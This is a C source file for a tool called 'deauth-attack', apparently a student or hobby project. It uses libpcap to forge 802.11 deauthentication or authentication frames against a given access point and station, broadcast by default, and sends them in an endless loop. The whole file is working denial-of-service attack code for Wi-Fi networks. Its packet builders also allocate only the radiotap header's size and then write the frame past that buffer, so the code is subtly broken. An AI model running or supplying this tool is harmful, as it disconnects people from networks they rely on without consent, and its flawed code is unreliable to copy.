#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ether.h>
#include <linux/if.h>
#include <unistd.h>

#include <pcap.h>

#include "util.h"
#include "ieee80211_radiotap.h"

struct config {
    char interface[IFNAMSIZ];
    uint8_t ap_mac_addr[ETH_ALEN];
    uint8_t station_mac_addr[ETH_ALEN];
    bool auth;
};

struct ieee80211_frm {
    union {
        uint16_t frm_ctrl;
        struct {
            uint8_t proto_ver:2;
            uint8_t type:2;
            uint8_t subtype:4;
            uint8_t flags;
        };
    };
    uint16_t duration_id;
    uint8_t addr1[ETH_ALEN];
    uint8_t addr2[ETH_ALEN];
    uint8_t addr3[ETH_ALEN];
    uint16_t seq_ctl;
    uint16_t reason;
} __packed;

void usage(void)
{
    puts("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]");
    puts("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

struct config *parse_config(int argc, char *argv[])
{
    struct config *conf;
    struct ether_addr *tmp;
    
    if (argc < 3) 
        goto parse_error;
        

    conf = calloc(1, sizeof(*conf));
    if (conf == NULL) {
        pr_err("There is no memory\n");
        return NULL;
    }

    strncpy(conf->interface, argv[1], sizeof(conf->interface));
    tmp = ether_aton(argv[2]);
    if (tmp == NULL)
        goto parse_error;

    memcpy(conf->ap_mac_addr, tmp, ETH_ALEN);
    /* station mac address is set to broadcast by default */
    memcpy(conf->station_mac_addr, "\xff\xff\xff\xff\xff\xff", ETH_ALEN);

    if (argc == 3)
        return conf; /* There are no addtional configs */

    tmp = ether_aton(argv[3]);
    if (tmp == NULL)
        goto parse_error;

    memcpy(conf->station_mac_addr, tmp, ETH_ALEN);
    if (argc == 4)
        return conf; /* There are no addtional configs */

    if (!strcmp("-auth", argv[4]))
        conf->auth = true;

    return conf;

parse_error:
    usage();
    return NULL;
}

pcap_t *init_pcap(char *interface)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        pr_err("pcap_open_live(%s): %s\n", interface, errbuf);
        return NULL;
    }

    return handle;
}

void *gen_deauth_pkt(uint8_t ap_mac_addr[ETH_ALEN], uint8_t station_mac_addr[ETH_ALEN])
{
    struct ieee80211_radiotap_header *radiotap_hdr;
    struct ieee80211_frm *frm;
    void *deauth_pkt;

    deauth_pkt = malloc(sizeof(*radiotap_hdr));
    if (deauth_pkt == NULL)
        return NULL;

    radiotap_hdr = deauth_pkt;
    radiotap_hdr->it_version = PKTHDR_RADIOTAP_VERSION;
    radiotap_hdr->it_len = sizeof(*radiotap_hdr);
    radiotap_hdr->it_present = 0;

    frm = (char *)radiotap_hdr + radiotap_hdr->it_len;
    frm->proto_ver = 0;     /* WLAN(PV0) */
    frm->type = 0;          /* Management */
    frm->subtype = 0b1100;  /* Deauthentication */
    frm->flags = 0;
    memcpy(frm->addr1, ap_mac_addr, ETH_ALEN);
    memcpy(frm->addr2, station_mac_addr, ETH_ALEN);
    memcpy(frm->addr3, ap_mac_addr, ETH_ALEN);
    frm->seq_ctl = 0;
    frm->reason = 0x7;

    return deauth_pkt;
}

void *gen_auth_pkt(uint8_t ap_mac_addr[ETH_ALEN], uint8_t station_mac_addr[ETH_ALEN])
{
    struct ieee80211_radiotap_header *radiotap_hdr;
    struct ieee80211_frm *frm;
    void *auth_pkt;

    auth_pkt = malloc(sizeof(*radiotap_hdr));
    if (auth_pkt == NULL)
        return NULL;

    radiotap_hdr = auth_pkt;
    radiotap_hdr->it_version = PKTHDR_RADIOTAP_VERSION;
    radiotap_hdr->it_len = sizeof(*radiotap_hdr);
    radiotap_hdr->it_present = 0;

    frm = (char *)radiotap_hdr + radiotap_hdr->it_len;
    frm->proto_ver = 0;     /* WLAN(PV0) */
    frm->type = 0;          /* Management */
    frm->subtype = 0b1011;  /* Authentication */
    frm->flags = 0;
    memcpy(frm->addr1, station_mac_addr, ETH_ALEN);
    memcpy(frm->addr2, ap_mac_addr, ETH_ALEN);
    memcpy(frm->addr3, ap_mac_addr, ETH_ALEN);
    frm->seq_ctl = 0;
    frm->reason = 0x7;

    return auth_pkt;
}

int send_pkt(pcap_t *handle, void *pkt)
{
    int ret;
    
    ret = pcap_sendpacket(handle, pkt, sizeof(struct ieee80211_radiotap_header) + sizeof(struct ieee80211_frm));
    if (ret < 0)
        return ret;
    
    return ret;
}

int main(int argc, char *argv[])
{
    struct config *conf;
    pcap_t *handle;
    void *pkt;
    int ret;

    conf = parse_config(argc, argv);
    if (conf == NULL) 
        return 0;
        
    handle = init_pcap(conf->interface);
    if (handle == NULL) 
        goto out_pcap_error;

    if (conf->auth)
        pkt = gen_auth_pkt(conf->ap_mac_addr, conf->station_mac_addr);
    else
        pkt = gen_deauth_pkt(conf->ap_mac_addr, conf->station_mac_addr);

    if (pkt == NULL)
        goto out_pkt_error;

    while (true) {
        ret = send_pkt(handle, pkt);
        if (ret < 0)
            goto out_error;
        usleep(5 * 100 * 1000); /* sleep(0.5) */
    }
    
    free(pkt);
    pcap_close(handle);
    free(conf); 

    return 0;

out_error:
    free(pkt);
out_pkt_error:
    pcap_close(handle);
out_pcap_error:
    free(conf);    

    return -1;
}
